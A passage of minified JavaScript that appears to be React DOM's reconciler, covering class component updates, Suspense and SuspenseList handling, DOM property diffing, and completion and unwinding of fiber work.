    typeof u == "object" && u !== null ? u = Lt(u) : (u = dt(n) ? Vr : Xe.current, u = Is(t, u));
    var d = n.getDerivedStateFromProps,
      f = typeof d == "function" || typeof i.getSnapshotBeforeUpdate == "function";
    f || typeof i.UNSAFE_componentWillReceiveProps != "function" && typeof i.componentWillReceiveProps != "function" || (a !== r || c !== u) && mm(t, i, r, u), $n = !1;
    var h = t.memoizedState;
    i.state = h, Wa(t, r, i, s), c = t.memoizedState, a !== r || h !== c || ut.current || $n ? (typeof d == "function" && (Lu(t, n, d, r), c = t.memoizedState), (a = $n || hm(t, n, a, r, h, c, u)) ? (f || typeof i.UNSAFE_componentWillMount != "function" && typeof i.componentWillMount != "function" || (typeof i.componentWillMount == "function" && i.componentWillMount(), typeof i.UNSAFE_componentWillMount == "function" && i.UNSAFE_componentWillMount()), typeof i.componentDidMount == "function" && (t.flags |= 4194308)) : (typeof i.componentDidMount == "function" && (t.flags |= 4194308), t.memoizedProps = r, t.memoizedState = c), i.props = r, i.state = c, i.context = u, r = a) : (typeof i.componentDidMount == "function" && (t.flags |= 4194308), r = !1)
  } else {
    i = t.stateNode, cy(e, t), a = t.memoizedProps, u = t.type === t.elementType ? a : zt(t.type, a), i.props = u, f = t.pendingProps, h = i.context, c = n.contextType, typeof c == "object" && c !== null ? c = Lt(c) : (c = dt(n) ? Vr : Xe.current, c = Is(t, c));
    var y = n.getDerivedStateFromProps;
    (d = typeof y == "function" || typeof i.getSnapshotBeforeUpdate == "function") || typeof i.UNSAFE_componentWillReceiveProps != "function" && typeof i.componentWillReceiveProps != "function" || (a !== f || h !== c) && mm(t, i, r, c), $n = !1, h = t.memoizedState, i.state = h, Wa(t, r, i, s);
    var w = t.memoizedState;
    a !== f || h !== w || ut.current || $n ? (typeof y == "function" && (Lu(t, n, y, r), w = t.memoizedState), (u = $n || hm(t, n, u, r, h, w, c) || !1) ? (d || typeof i.UNSAFE_componentWillUpdate != "function" && typeof i.componentWillUpdate != "function" || (typeof i.componentWillUpdate == "function" && i.componentWillUpdate(r, w, c), typeof i.UNSAFE_componentWillUpdate == "function" && i.UNSAFE_componentWillUpdate(r, w, c)), typeof i.componentDidUpdate == "function" && (t.flags |= 4), typeof i.getSnapshotBeforeUpdate == "function" && (t.flags |= 1024)) : (typeof i.componentDidUpdate != "function" || a === e.memoizedProps && h === e.memoizedState || (t.flags |= 4), typeof i.getSnapshotBeforeUpdate != "function" || a === e.memoizedProps && h === e.memoizedState || (t.flags |= 1024), t.memoizedProps = r, t.memoizedState = w), i.props = r, i.state = w, i.context = c, r = u) : (typeof i.componentDidUpdate != "function" || a === e.memoizedProps && h === e.memoizedState || (t.flags |= 4), typeof i.getSnapshotBeforeUpdate != "function" || a === e.memoizedProps && h === e.memoizedState || (t.flags |= 1024), r = !1)
  }
  return Bu(e, t, n, r, o, s)
}

function Bu(e, t, n, r, s, o) {
  Iy(e, t);
  var i = (t.flags & 128) !== 0;
  if (!r && !i) return s && om(t, n, !1), Rn(e, t, o);
  r = t.stateNode, jb.current = t;
  var a = i && typeof n.getDerivedStateFromError != "function" ? null : r.render();
  return t.flags |= 1, e !== null && i ? (t.child = Os(t, e.child, null, o), t.child = Os(t, null, a, o)) : et(e, t, a, o), t.memoizedState = r.state, s && om(t, n, !0), t.child
}

function Ly(e) {
  var t = e.stateNode;
  t.pendingContext ? sm(e, t.pendingContext, t.pendingContext !== t.context) : t.context && sm(e, t.context, !1), tf(e, t.containerInfo)
}

function bm(e, t, n, r, s) {
  return Ls(), qd(s), t.flags |= 256, et(e, t, n, r), t.child
}
var zu = {
  dehydrated: null,
  treeContext: null,
  retryLane: 0
};

function Uu(e) {
  return {
    baseLanes: e,
    cachePool: null,
    transitions: null
  }
}

function Oy(e, t, n) {
  var r = t.pendingProps,
    s = ve.current,
    o = !1,
    i = (t.flags & 128) !== 0,
    a;
  if ((a = i) || (a = e !== null && e.memoizedState === null ? !1 : (s & 2) !== 0), a ? (o = !0, t.flags &= -129) : (e === null || e.memoizedState !== null) && (s |= 1), de(ve, s & 1), e === null) return _u(t), e = t.memoizedState, e !== null && (e = e.dehydrated, e !== null) ? (t.mode & 1 ? e.data === "$!" ? t.lanes = 8 : t.lanes = 1073741824 : t.lanes = 1, null) : (i = r.children, e = r.fallback, o ? (r = t.mode, o = t.child, i = {
    mode: "hidden",
    children: i
  }, !(r & 1) && o !== null ? (o.childLanes = 0, o.pendingProps = i) : o = Pl(i, r, 0, null), e = Or(e, r, n, null), o.return = t, e.return = t, o.sibling = e, t.child = o, t.child.memoizedState = Uu(n), t.memoizedState = zu, e) : uf(t, i));
  if (s = e.memoizedState, s !== null && (a = s.dehydrated, a !== null)) return Ab(e, t, i, r, a, s, n);
  if (o) {
    o = r.fallback, i = t.mode, s = e.child, a = s.sibling;
    var c = {
      mode: "hidden",
      children: r.children
    };
    return !(i & 1) && t.child !== s ? (r = t.child, r.childLanes = 0, r.pendingProps = c, t.deletions = null) : (r = lr(s, c), r.subtreeFlags = s.subtreeFlags & 14680064), a !== null ? o = lr(a, o) : (o = Or(o, i, n, null), o.flags |= 2), o.return = t, r.return = t, r.sibling = o, t.child = r, r = o, o = t.child, i = e.child.memoizedState, i = i === null ? Uu(n) : {
      baseLanes: i.baseLanes | n,
      cachePool: null,
      transitions: i.transitions
    }, o.memoizedState = i, o.childLanes = e.childLanes & ~n, t.memoizedState = zu, r
  }
  return o = e.child, e = o.sibling, r = lr(o, {
    mode: "visible",
    children: r.children
  }), !(t.mode & 1) && (r.lanes = n), r.return = t, r.sibling = null, e !== null && (n = t.deletions, n === null ? (t.deletions = [e], t.flags |= 16) : n.push(e)), t.child = r, t.memoizedState = null, r
}

function uf(e, t) {
  return t = Pl({
    mode: "visible",
    children: t
  }, e.mode, 0, null), t.return = e, e.child = t
}

function Ji(e, t, n, r) {
  return r !== null && qd(r), Os(t, e.child, null, n), e = uf(t, t.pendingProps.children), e.flags |= 2, t.memoizedState = null, e
}

function Ab(e, t, n, r, s, o, i) {
  if (n) return t.flags & 256 ? (t.flags &= -257, r = Ac(Error(O(422))), Ji(e, t, i, r)) : t.memoizedState !== null ? (t.child = e.child, t.flags |= 128, null) : (o = r.fallback, s = t.mode, r = Pl({
    mode: "visible",
    children: r.children
  }, s, 0, null), o = Or(o, s, i, null), o.flags |= 2, r.return = t, o.return = t, r.sibling = o, t.child = r, t.mode & 1 && Os(t, e.child, null, i), t.child.memoizedState = Uu(i), t.memoizedState = zu, o);
  if (!(t.mode & 1)) return Ji(e, t, i, null);
  if (s.data === "$!") {
    if (r = s.nextSibling && s.nextSibling.dataset, r) var a = r.dgst;
    return r = a, o = Error(O(419)), r = Ac(o, r, void 0), Ji(e, t, i, r)
  }
  if (a = (i & e.childLanes) !== 0, ct || a) {
    if (r = Le, r !== null) {
      switch (i & -i) {
        case 4:
          s = 2;
          break;
        case 16:
          s = 8;
          break;
        case 64:
        case 128:
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
        case 67108864:
          s = 32;
          break;
        case 536870912:
          s = 268435456;
          break;
        default:
          s = 0
      }
      s = s & (r.suspendedLanes | i) ? 0 : s, s !== 0 && s !== o.retryLane && (o.retryLane = s, kn(e, s), Gt(r, e, s, -1))
    }
    return gf(), r = Ac(Error(O(421))), Ji(e, t, i, r)
  }
  return s.data === "$?" ? (t.flags |= 128, t.child = e.child, t = Vb.bind(null, e), s._reactRetry = t, null) : (e = o.treeContext, yt = sr(s.nextSibling), xt = t, ye = !0, Wt = null, e !== null && (Rt[Dt++] = vn, Rt[Dt++] = xn, Rt[Dt++] = Br, vn = e.id, xn = e.overflow, Br = t), t = uf(t, r.children), t.flags |= 4096, t)
}

function Sm(e, t, n) {
  e.lanes |= t;
  var r = e.alternate;
  r !== null && (r.lanes |= t), Iu(e.return, t, n)
}

function Pc(e, t, n, r, s) {
  var o = e.memoizedState;
  o === null ? e.memoizedState = {
    isBackwards: t,
    rendering: null,
    renderingStartTime: 0,
    last: r,
    tail: n,
    tailMode: s
  } : (o.isBackwards = t, o.rendering = null, o.renderingStartTime = 0, o.last = r, o.tail = n, o.tailMode = s)
}

function Fy(e, t, n) {
  var r = t.pendingProps,
    s = r.revealOrder,
    o = r.tail;
  if (et(e, t, r.children, n), r = ve.current, r & 2) r = r & 1 | 2, t.flags |= 128;
  else {
    if (e !== null && e.flags & 128) e: for (e = t.child; e !== null;) {
      if (e.tag === 13) e.memoizedState !== null && Sm(e, n, t);
      else if (e.tag === 19) Sm(e, n, t);
      else if (e.child !== null) {
        e.child.return = e, e = e.child;
        continue
      }
      if (e === t) break e;
      for (; e.sibling === null;) {
        if (e.return === null || e.return === t) break e;
        e = e.return
      }
      e.sibling.return = e.return, e = e.sibling
    }
    r &= 1
  }
  if (de(ve, r), !(t.mode & 1)) t.memoizedState = null;
  else switch (s) {
    case "forwards":
      for (n = t.child, s = null; n !== null;) e = n.alternate, e !== null && Ka(e) === null && (s = n), n = n.sibling;
      n = s, n === null ? (s = t.child, t.child = null) : (s = n.sibling, n.sibling = null), Pc(t, !1, s, n, o);
      break;
    case "backwards":
      for (n = null, s = t.child, t.child = null; s !== null;) {
        if (e = s.alternate, e !== null && Ka(e) === null) {
          t.child = s;
          break
        }
        e = s.sibling, s.sibling = n, n = s, s = e
      }
      Pc(t, !0, n, null, o);
      break;
    case "together":
      Pc(t, !1, null, null, void 0);
      break;
    default:
      t.memoizedState = null
  }
  return t.child
}

function xa(e, t) {
  !(t.mode & 1) && e !== null && (e.alternate = null, t.alternate = null, t.flags |= 2)
}

function Rn(e, t, n) {
  if (e !== null && (t.dependencies = e.dependencies), Ur |= t.lanes, !(n & t.childLanes)) return null;
  if (e !== null && t.child !== e.child) throw Error(O(153));
  if (t.child !== null) {
    for (e = t.child, n = lr(e, e.pendingProps), t.child = n, n.return = t; e.sibling !== null;) e = e.sibling, n = n.sibling = lr(e, e.pendingProps), n.return = t;
    n.sibling = null
  }
  return t.child
}

function Pb(e, t, n) {
  switch (t.tag) {
    case 3:
      Ly(t), Ls();
      break;
    case 5:
      uy(t);
      break;
    case 1:
      dt(t.type) && Ba(t);
      break;
    case 4:
      tf(t, t.stateNode.containerInfo);
      break;
    case 10:
      var r = t.type._context,
        s = t.memoizedProps.value;
      de($a, r._currentValue), r._currentValue = s;
      break;
    case 13:
      if (r = t.memoizedState, r !== null) return r.dehydrated !== null ? (de(ve, ve.current & 1), t.flags |= 128, null) : n & t.child.childLanes ? Oy(e, t, n) : (de(ve, ve.current & 1), e = Rn(e, t, n), e !== null ? e.sibling : null);
      de(ve, ve.current & 1);
      break;
    case 19:
      if (r = (n & t.childLanes) !== 0, e.flags & 128) {
        if (r) return Fy(e, t, n);
        t.flags |= 128
      }
      if (s = t.memoizedState, s !== null && (s.rendering = null, s.tail = null, s.lastEffect = null), de(ve, ve.current), r) break;
      return null;
    case 22:
    case 23:
      return t.lanes = 0, _y(e, t, n)
  }
  return Rn(e, t, n)
}
var Vy, $u, By, zy;
Vy = function (e, t) {
  for (var n = t.child; n !== null;) {
    if (n.tag === 5 || n.tag === 6) e.appendChild(n.stateNode);
    else if (n.tag !== 4 && n.child !== null) {
      n.child.return = n, n = n.child;
      continue
    }
    if (n === t) break;
    for (; n.sibling === null;) {
      if (n.return === null || n.return === t) return;
      n = n.return
    }
    n.sibling.return = n.return, n = n.sibling
  }
};
$u = function () { };
By = function (e, t, n, r) {
  var s = e.memoizedProps;
  if (s !== r) {
    e = t.stateNode, Tr(on.current);
    var o = null;
    switch (n) {
      case "input":
        s = du(e, s), r = du(e, r), o = [];
        break;
      case "select":
        s = be({}, s, {
          value: void 0
        }), r = be({}, r, {
          value: void 0
        }), o = [];
        break;
      case "textarea":
        s = mu(e, s), r = mu(e, r), o = [];
        break;
      default:
        typeof s.onClick != "function" && typeof r.onClick == "function" && (e.onclick = Fa)
    }
    gu(n, r);
    var i;
    n = null;
    for (u in s)
      if (!r.hasOwnProperty(u) && s.hasOwnProperty(u) && s[u] != null)
        if (u === "style") {
          var a = s[u];
          for (i in a) a.hasOwnProperty(i) && (n || (n = {}), n[i] = "")
        } else u !== "dangerouslySetInnerHTML" && u !== "children" && u !== "suppressContentEditableWarning" && u !== "suppressHydrationWarning" && u !== "autoFocus" && ($o.hasOwnProperty(u) ? o || (o = []) : (o = o || []).push(u, null));
    for (u in r) {
      var c = r[u];
      if (a = s != null ? s[u] : void 0, r.hasOwnProperty(u) && c !== a && (c != null || a != null))
        if (u === "style")
          if (a) {
            for (i in a) !a.hasOwnProperty(i) || c && c.hasOwnProperty(i) || (n || (n = {}), n[i] = "");
            for (i in c) c.hasOwnProperty(i) && a[i] !== c[i] && (n || (n = {}), n[i] = c[i])
          } else n || (o || (o = []), o.push(u, n)), n = c;
        else u === "dangerouslySetInnerHTML" ? (c = c ? c.__html : void 0, a = a ? a.__html : void 0, c != null && a !== c && (o = o || []).push(u, c)) : u === "children" ? typeof c != "string" && typeof c != "number" || (o = o || []).push(u, "" + c) : u !== "suppressContentEditableWarning" && u !== "suppressHydrationWarning" && ($o.hasOwnProperty(u) ? (c != null && u === "onScroll" && he("scroll", e), o || a === c || (o = [])) : (o = o || []).push(u, c))
    }
    n && (o = o || []).push("style", n);
    var u = o;
    (t.updateQueue = u) && (t.flags |= 4)
  }
};
zy = function (e, t, n, r) {
  n !== r && (t.flags |= 4)
};

function mo(e, t) {
  if (!ye) switch (e.tailMode) {
    case "hidden":
      t = e.tail;
      for (var n = null; t !== null;) t.alternate !== null && (n = t), t = t.sibling;
      n === null ? e.tail = null : n.sibling = null;
      break;
    case "collapsed":
      n = e.tail;
      for (var r = null; n !== null;) n.alternate !== null && (r = n), n = n.sibling;
      r === null ? t || e.tail === null ? e.tail = null : e.tail.sibling = null : r.sibling = null
  }
}

function We(e) {
  var t = e.alternate !== null && e.alternate.child === e.child,
    n = 0,
    r = 0;
  if (t)
    for (var s = e.child; s !== null;) n |= s.lanes | s.childLanes, r |= s.subtreeFlags & 14680064, r |= s.flags & 14680064, s.return = e, s = s.sibling;
  else
    for (s = e.child; s !== null;) n |= s.lanes | s.childLanes, r |= s.subtreeFlags, r |= s.flags, s.return = e, s = s.sibling;
  return e.subtreeFlags |= r, e.childLanes = n, t
}

function Eb(e, t, n) {
  var r = t.pendingProps;
  switch (Gd(t), t.tag) {
    case 2:
    case 16:
    case 15:
    case 0:
    case 11:
    case 7:
    case 8:
    case 12:
    case 9:
    case 14:
      return We(t), null;
    case 1:
      return dt(t.type) && Va(), We(t), null;
    case 3:
      return r = t.stateNode, Fs(), pe(ut), pe(Xe), rf(), r.pendingContext && (r.context = r.pendingContext, r.pendingContext = null), (e === null || e.child === null) && (Yi(t) ? t.flags |= 4 : e === null || e.memoizedState.isDehydrated && !(t.flags & 256) || (t.flags |= 1024, Wt !== null && (Xu(Wt), Wt = null))), $u(e, t), We(t), null;
    case 5:
      nf(t);
      var s = Tr(ti.current);
      if (n = t.type, e !== null && t.stateNode != null) By(e, t, n, r, s), e.ref !== t.ref && (t.flags |= 512, t.flags |= 2097152);
      else {
        if (!r) {
          if (t.stateNode === null) throw Error(O(166));
          return We(t), null
        }
        if (e = Tr(on.current), Yi(t)) {
          r = t.stateNode, n = t.type;
          var o = t.memoizedProps;
          switch (r[nn] = t, r[Zo] = o, e = (t.mode & 1) !== 0, n) {
            case "dialog":
              he("cancel", r), he("close", r);
              break;
            case "iframe":
            case "object":
            case "embed":
              he("load", r);
              break;
            case "video":
            case "audio":
              for (s = 0; s < jo.length; s++) he(jo[s], r);
              break;
            case "source":
              he("error", r);
              break;
            case "img":
            case "image":
            case "link":
              he("error", r), he("load", r);
              break;
            case "details":
              he("toggle", r);
              break;
            case "input":
              Rh(r, o), he("invalid", r);
              break;
            case "select":
              r._wrapperState = {
                wasMultiple: !!o.multiple
              }, he("invalid", r);
              break;
            case "textarea":
              Mh(r, o), he("invalid", r)
          }
          gu(n, o), s = null;
          for (var i in o)
            if (o.hasOwnProperty(i)) {
              var a = o[i];
              i === "children" ? typeof a == "string" ? r.textContent !== a && (o.suppressHydrationWarning !== !0 && qi(r.textContent, a, e), s = ["children", a]) : typeof a == "number" && r.textContent !== "" + a && (o.suppressHydrationWarning !== !0 && qi(r.textContent, a, e), s = ["children", "" + a]) : $o.hasOwnProperty(i) && a != null && i === "onScroll" && he("scroll", r)
            } switch (n) {
              case "input":
                zi(r), Dh(r, o, !0);
                break;
              case "textarea":
                zi(r), _h(r);
                break;
              case "select":
              case "option":
                break;
              default:
                typeof o.onClick == "function" && (r.onclick = Fa)
            }
          r = s, t.updateQueue = r, r !== null && (t.flags |= 4)
        } else {
          i = s.nodeType === 9 ? s : s.ownerDocument, e === "http://www.w3.org/1999/xhtml" && (e = p0(n)), e === "http://www.w3.org/1999/xhtml" ? n === "script" ? (e = i.createElement("div"), e.innerHTML = "<script><\/script>", e = e.removeChild(e.firstChild)) : typeof r.is == "string" ? e = i.createElement(n, {
            is: r.is
          }) : (e = i.createElement(n), n === "select" && (i = e, r.multiple ? i.multiple = !0 : r.size && (i.size = r.size))) : e = i.createElementNS(e, n), e[nn] = t, e[Zo] = r, Vy(e, t, !1, !1), t.stateNode = e;
          e: {
            switch (i = yu(n, r), n) {
              case "dialog":
                he("cancel", e), he("close", e), s = r;
                break;
              case "iframe":
              case "object":
              case "embed":
                he("load", e), s = r;
                break;
              case "video":
              case "audio":
                for (s = 0; s < jo.length; s++) he(jo[s], e);
                s = r;
                break;
              case "source":
                he("error", e), s = r;
                break;
              case "img":
              case "image":
              case "link":
                he("error", e), he("load", e), s = r;
                break;
              case "details":
                he("toggle", e), s = r;
                break;
              case "input":
                Rh(e, r), s = du(e, r), he("invalid", e);
                break;
              case "option":
                s = r;
                break;
              case "select":
                e._wrapperState = {
                  wasMultiple: !!r.multiple
                }, s = be({}, r, {
                  value: void 0
                }), he("invalid", e);
                break;
              case "textarea":
                Mh(e, r), s = mu(e, r), he("invalid", e);
                break;
              default:
                s = r
            }
            gu(n, s),
              a = s;
            for (o in a)
              if (a.hasOwnProperty(o)) {
                var c = a[o];
                o === "style" ? v0(e, c) : o === "dangerouslySetInnerHTML" ? (c = c ? c.__html : void 0, c != null && g0(e, c)) : o === "children" ? typeof c == "string" ? (n !== "textarea" || c !== "") && Ho(e, c) : typeof c == "number" && Ho(e, "" + c) : o !== "suppressContentEditableWarning" && o !== "suppressHydrationWarning" && o !== "autoFocus" && ($o.hasOwnProperty(o) ? c != null && o === "onScroll" && he("scroll", e) : c != null && Md(e, o, c, i))
              } switch (n) {
                case "input":
                  zi(e), Dh(e, r, !1);
                  break;
                case "textarea":
                  zi(e), _h(e);
                  break;
                case "option":
                  r.value != null && e.setAttribute("value", "" + dr(r.value));
                  break;
                case "select":
                  e.multiple = !!r.multiple, o = r.value, o != null ? vs(e, !!r.multiple, o, !1) : r.defaultValue != null && vs(e, !!r.multiple, r.defaultValue, !0);
                  break;
                default:
                  typeof s.onClick == "function" && (e.onclick = Fa)
              }
            switch (n) {
              case "button":
              case "input":
              case "select":
              case "textarea":
                r = !!r.autoFocus;
                break e;
              case "img":
                r = !0;
                break e;
              default:
                r = !1
            }
          }
          r && (t.flags |= 4)
        }
        t.ref !== null && (t.flags |= 512, t.flags |= 2097152)
      }
      return We(t), null;
    case 6:
      if (e && t.stateNode != null) zy(e, t, e.memoizedProps, r);
      else {
        if (typeof r != "string" && t.stateNode === null) throw Error(O(166));
        if (n = Tr(ti.current), Tr(on.current), Yi(t)) {
          if (r = t.stateNode, n = t.memoizedProps, r[nn] = t, (o = r.nodeValue !== n) && (e = xt, e !== null)) switch (e.tag) {
            case 3:
              qi(r.nodeValue, n, (e.mode & 1) !== 0);
              break;
            case 5:
              e.memoizedProps.suppressHydrationWarning !== !0 && qi(r.nodeValue, n, (e.mode & 1) !== 0)
          }
          o && (t.flags |= 4)
        } else r = (n.nodeType === 9 ? n : n.ownerDocument).createTextNode(r), r[nn] = t, t.stateNode = r
      }
      return We(t), null;
    case 13:
      if (pe(ve), r = t.memoizedState, e === null || e.memoizedState !== null && e.memoizedState.dehydrated !== null) {
        if (ye && yt !== null && t.mode & 1 && !(t.flags & 128)) oy(), Ls(), t.flags |= 98560, o = !1;
        else if (o = Yi(t), r !== null && r.dehydrated !== null) {
          if (e === null) {
            if (!o) throw Error(O(318));
            if (o = t.memoizedState, o = o !== null ? o.dehydrated : null, !o) throw Error(O(317));
            o[nn] = t
          } else Ls(), !(t.flags & 128) && (t.memoizedState = null), t.flags |= 4;
          We(t), o = !1
        } else Wt !== null && (Xu(Wt), Wt = null), o = !0;
        if (!o) return t.flags & 65536 ? t : null
      }
      return t.flags & 128 ? (t.lanes = n, t) : (r = r !== null, r !== (e !== null && e.memoizedState !== null) && r && (t.child.flags |= 8192, t.mode & 1 && (e === null || ve.current & 1 ? _e === 0 && (_e = 3) : gf())), t.updateQueue !== null && (t.flags |= 4), We(t), null);
    case 4:
      return Fs(), $u(e, t), e === null && Xo(t.stateNode.containerInfo), We(t), null;
    case 10:
      return Jd(t.type._context), We(t), null;
    case 17:
      return dt(t.type) && Va(), We(t), null;
    case 19:
      if (pe(ve), o = t.memoizedState, o === null) return We(t), null;
      if (r = (t.flags & 128) !== 0, i = o.rendering, i === null)
        if (r) mo(o, !1);
        else {
          if (_e !== 0 || e !== null && e.flags & 128)
            for (e = t.child; e !== null;) {
              if (i = Ka(e), i !== null) {
                for (t.flags |= 128, mo(o, !1), r = i.updateQueue, r !== null && (t.updateQueue = r, t.flags |= 4), t.subtreeFlags = 0, r = n, n = t.child; n !== null;) o = n, e = r, o.flags &= 14680066, i = o.alternate, i === null ? (o.childLanes = 0, o.lanes = e, o.child = null, o.subtreeFlags = 0, o.memoizedProps = null, o.memoizedState = null, o.updateQueue = null, o.dependencies = null, o.stateNode = null) : (o.childLanes = i.childLanes, o.lanes = i.lanes, o.child = i.child, o.subtreeFlags = 0, o.deletions = null, o.memoizedProps = i.memoizedProps, o.memoizedState = i.memoizedState, o.updateQueue = i.updateQueue, o.type = i.type, e = i.dependencies, o.dependencies = e === null ? null : {
                  lanes: e.lanes,
                  firstContext: e.firstContext
                }), n = n.sibling;
                return de(ve, ve.current & 1 | 2), t.child
              }
              e = e.sibling
            }
          o.tail !== null && Pe() > Bs && (t.flags |= 128, r = !0, mo(o, !1), t.lanes = 4194304)
        }
      else {
        if (!r)
          if (e = Ka(i), e !== null) {
            if (t.flags |= 128, r = !0, n = e.updateQueue, n !== null && (t.updateQueue = n, t.flags |= 4), mo(o, !0), o.tail === null && o.tailMode === "hidden" && !i.alternate && !ye) return We(t), null
          } else 2 * Pe() - o.renderingStartTime > Bs && n !== 1073741824 && (t.flags |= 128, r = !0, mo(o, !1), t.lanes = 4194304);
        o.isBackwards ? (i.sibling = t.child, t.child = i) : (n = o.last, n !== null ? n.sibling = i : t.child = i, o.last = i)
      }
      return o.tail !== null ? (t = o.tail, o.rendering = t, o.tail = t.sibling, o.renderingStartTime = Pe(), t.sibling = null, n = ve.current, de(ve, r ? n & 1 | 2 : n & 1), t) : (We(t), null);
    case 22:
    case 23:
      return pf(), r = t.memoizedState !== null, e !== null && e.memoizedState !== null !== r && (t.flags |= 8192), r && t.mode & 1 ? pt & 1073741824 && (We(t), t.subtreeFlags & 6 && (t.flags |= 8192)) : We(t), null;
    case 24:
      return null;
    case 25:
      return null
  }
  throw Error(O(156, t.tag))
}

function Tb(e, t) {
  switch (Gd(t), t.tag) {
    case 1:
      return dt(t.type) && Va(), e = t.flags, e & 65536 ? (t.flags = e & -65537 | 128, t) : null;
    case 3:
      return Fs(), pe(ut), pe(Xe), rf(), e = t.flags, e & 65536 && !(e & 128) ? (t.flags = e & -65537 | 128, t) : null;
    case 5:
      return nf(t), null;
    case 13:
      if (pe(ve), e = t.memoizedState, e !== null && e.dehydrated !== null) {
        if (t.alternate === null) throw Error(O(340));
        Ls()
      }
      return e = t.flags, e & 65536 ? (t.flags = e & -65537 | 128, t) : null;
    case 19:
      return pe(ve), null;
    case 4:
      return Fs(), null;
    case 10:
      return Jd(t.type._context), null;
    case 22:
    case 23:
      return pf(), null;
    case 24:
      return null;
    default:
      return null
  }
}
var Zi = !1,
  Ge = !1,
  kb = typeof WeakSet == "function" ? WeakSet : Set,
  H = null;

function ds(e, t) {
  var n = e.ref;
  if (n !== null)
    if (typeof n == "function") try {
      n(null)
    } catch (r) {
      Ne(e, t, r)
    } else n.current = null
}

function Hu(e, t, n) {
  try {
    n()
  } catch (r) {
    Ne(e, t, r)
  }
}
var Cm = !1;

function Rb(e, t) {
  if (Pu = Ia, e = K0(), Kd(e)) {
    if ("selectionStart" in e) var n = {
      start: e.selectionStart,
      end: e.selectionEnd
    };
    else e: {
      n = (n = e.ownerDocument) && n.defaultView || window;
      var r = n.getSelection && n.getSelection();
      if (r && r.rangeCount !== 0) {
        n = r.anchorNode;
        var s = r.anchorOffset,
          o = r.focusNode;
        r = r.focusOffset;
        try {
          n.nodeType, o.nodeType
        } catch {
          n = null;
          break e
        }
        var i = 0,
          a = -1,
          c = -1,
          u = 0,
          d = 0,
          f = e,
          h = null;
        t: for (; ;) {
          for (var y; f !== n || s !== 0 && f.nodeType !== 3 || (a = i + s), f !== o || r !== 0 && f.nodeType !== 3 || (c = i + r), f.nodeType === 3 && (i += f.nodeValue.length), (y = f.firstChild) !== null;) h = f, f = y;
          for (; ;) {
            if (f === e) break t;
            if (h === n && ++u === s && (a = i), h === o && ++d === r && (c = i), (y = f.nextSibling) !== null) break;
            f = h, h = f.parentNode
          }
          f = y
        }
        n = a === -1 || c === -1 ? null : {
          start: a,
          end: c
        }
      } else n = null
    }
    n = n || {
      start: 0,
      end: 0
    }
  } else n = null;
  for (Eu = {
    focusedElem: e,
    selectionRange: n
  }, Ia = !1, H = t; H !== null;)
    if (t = H, e = t.child, (t.subtreeFlags & 1028) !== 0 && e !== null) e.return = t, H = e;
    else
      for (; H !== null;) {
        t = H;
        try {
          var w = t.alternate;
          if (t.flags & 1024) switch (t.tag) {
            case 0:
            case 11:
            case 15:
              break;
            case 1:
              if (w !== null) {
                var v = w.memoizedProps,
                  S = w.memoizedState,
                  g = t.stateNode,
                  p = g.getSnapshotBeforeUpdate(t.elementType === t.type ? v : zt(t.type, v), S);
                g.__reactInternalSnapshotBeforeUpdate = p
              }
              break;
            case 3:
              var m = t.stateNode.containerInfo;
              m.nodeType === 1 ? m.textContent = "" : m.nodeType === 9 && m.documentElement && m.removeChild(m.documentElement);
              break;
            case 5:
            case 6:
            case 4:
            case 17:
              break;
            default:
              throw Error(O(163))
          }
        } catch (b) {
          Ne(t, t.return, b)
        }
        if (e = t.sibling, e !== null) {
          e.return = t.return, H = e;
          break
        }
        H = t.return
      }
  return w = Cm, Cm = !1, w
}

function _o(e, t, n) {
  var r = t.updateQueue;
  if (r = r !== null ? r.lastEffect : null, r !== null) {
    var s = r = r.next;
    do {
      if ((s.tag & e) === e) {
        var o = s.destroy;
        s.destroy = void 0, o !== void 0 && Hu(t, n, o)
      }
      s = s.next
    } while (s !== r)
  }
}

function jl(e, t) {
  if (t = t.updateQueue, t = t !== null ? t.lastEffect : null, t !== null) {
    var n = t = t.next;
    do {
      if ((n.tag & e) === e) {
        var r = n.create;
        n.destroy = r()
      }
      n = n.next
    } while (n !== t)
  }
}

function Wu(e) {
  var t = e.ref;
  if (t !== null) {
    var n = e.stateNode;
    switch (e.tag) {
      case 5:
        e = n;
        break;
      default:
        e = n
    }
    typeof t == "function" ? t(e) : t.current = e
  }
}

function Uy(e) {
  var t = e.alternate;
  t !== null && (e.alternate = null, Uy(t)), e.child = null, e.deletions = null, e.sibling = null, e.tag === 5 && (t = e.stateNode, t !== null && (delete t[nn], delete t[Zo], delete t[Ru], delete t[hb], delete t[mb])), e.stateNode = null, e.return = null, e.dependencies = null, e.memoizedProps = null, e.memoizedState = null, e.pendingProps = null, e.stateNode = null, e.updateQueue = null
}

function $y(e) {
  return e.tag === 5 || e.tag === 3 || e.tag === 4
}

function Nm(e) {
  e: for (; ;) {
    for (; e.sibling === null;) {
      if (e.return === null || $y(e.return)) return null;
      e = e.return
    }
    for (e.sibling.return = e.return, e = e.sibling; e.tag !== 5 && e.tag !== 6 && e.tag !== 18;) {
      if (e.flags & 2 || e.child === null || e.tag === 4) continue e;
      e.child.return = e, e = e.child
    }
    if (!(e.flags & 2)) return e.stateNode
  }
}

function Ku(e, t, n) {
  var r = e.tag;
  if (r === 5 || r === 6) e = e.stateNode, t ? n.nodeType === 8 ? n.parentNode.insertBefore(e, t) : n.insertBefore(e, t) : (n.nodeType === 8 ? (t = n.parentNode, t.insertBefore(e, n)) : (t = n, t.appendChild(e)), n = n._reactRootContainer, n != null || t.onclick !== null || (t.onclick = Fa));
  else if (r !== 4 && (e = e.child, e !== null))
    for (Ku(e, t, n), e = e.sibling; e !== null;) Ku(e, t, n), e = e.sibling
}

function Qu(e, t, n) {
  var r = e.tag;
  if (r === 5 || r === 6) e = e.stateNode, t ? n.insertBefore(e, t) : n.appendChild(e);
  else if (r !== 4 && (e = e.child, e !== null))
    for (Qu(e, t, n), e = e.sibling; e !== null;) Qu(e, t, n), e = e.sibling
}
var Oe = null,
  Ht = !1;

function On(e, t, n) {
  for (n = n.child; n !== null;) Hy(e, t, n), n = n.sibling
}

function Hy(e, t, n) {
  if (sn && typeof sn.onCommitFiberUnmount == "function") try {
    sn.onCommitFiberUnmount(yl, n)
  } catch { }
  switch (n.tag) {
    case 5:
      Ge || ds(n, t);
    case 6:
      var r = Oe,
        s = Ht;
